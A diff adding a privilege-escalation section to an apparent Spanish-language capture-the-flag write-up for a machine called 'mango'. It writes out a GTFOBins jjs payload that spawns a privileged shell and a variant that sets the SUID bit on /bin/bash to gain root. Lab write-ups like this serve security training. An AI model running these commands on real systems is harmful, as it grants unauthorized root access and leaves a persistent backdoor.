@@ -159,5 +159,21 @@ mango@mango:/$ find / -group admin -type f 2>/dev/null
 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 -rwsr-sr-- 1 root  admin  10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
+Como nosotros teniamos la password encontrada del usuario `Admin` podemos probar a hacer un cambio de usuario con el comando `su`.
+Vemos que lo hacemos sin problema y conseguimos la flag de `user.txt`.
 
+# Escalada de privilegios mediante el Binario SUID jjs
+Con el binario SUID encontrado de jjs nos dirigimos como siempre a la pagina de GTFOBins y chequeamos por `jjs` y permisos SUID:
+```bash
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs ``
+```
+Para Hacerlo de una manera mas sencilla, nos abrimos una session interactiva y modificamos un poco el comando a introducir:
+- La Modificamos ya que estamos en una session interactiva de jjs -
+```bash
+$ Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
+
+$ Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
+```
+Introducimos la sentencia en `java` y conseguimos `root`
+Maquina Rooteada =) KOHack
 
